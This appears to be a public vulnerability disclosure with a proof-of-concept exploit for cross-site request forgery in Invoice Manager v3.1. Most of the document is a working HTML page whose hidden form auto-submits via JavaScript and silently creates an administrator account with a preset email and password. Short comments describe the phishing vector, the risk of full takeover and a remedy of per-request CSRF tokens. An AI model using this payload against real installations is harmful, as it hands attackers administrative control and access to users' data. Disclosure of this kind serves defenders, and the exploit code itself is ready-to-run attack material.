# Invoice Manager v3.1 Cross site request forgery (Add Admin)
#
# Description : Invoice Manager v3.1 is vulnerable to CSRF attack (No CSRF token in place) which if an admin user can be
# tricked to visit a crafted URL created by attacker (via spear phishing/social engineering).
# Once exploited, the attacker can login as the admin using the email and the password in the below exploit.
#
#
# ======================CSRF POC (Adding New user with Administrator Privileges)==================================


<html>
<body>
<form name="csrf_form" action="http://localhost/invoice/index.php?controller=pjAdminUsers&action=pjActionCreate" method="post">

<input name="user_create" id="user_create" value="1" type="hidden">
<input name="role_id" id="role_id" value="1" type="hidden" >
<input name="email" id="email" value="AliBawazeEer@localhost.com" type="hidden">
<input name="password" id="password" value="12341234" type="hidden">
<input name="name" id="name" value="Ali BawazeEer" type="hidden">
<input name="phone" id="phone" value="911911911" type="hidden">
<input name="status" id="status" value="T" type="hidden">
<script type="text/javascript">document.csrf_form.submit();</script>
</body>
</html>

# =================================================EOF =======================================================
#
#
# Risk : attackers are able to gain full access to the administrator panel after chaning the password for the admin
# and thus have total control over the web application, including content change,and change user's account download backup of the site access to user's data..
#
#
# Remedy : developer should implement CSRF token for each request
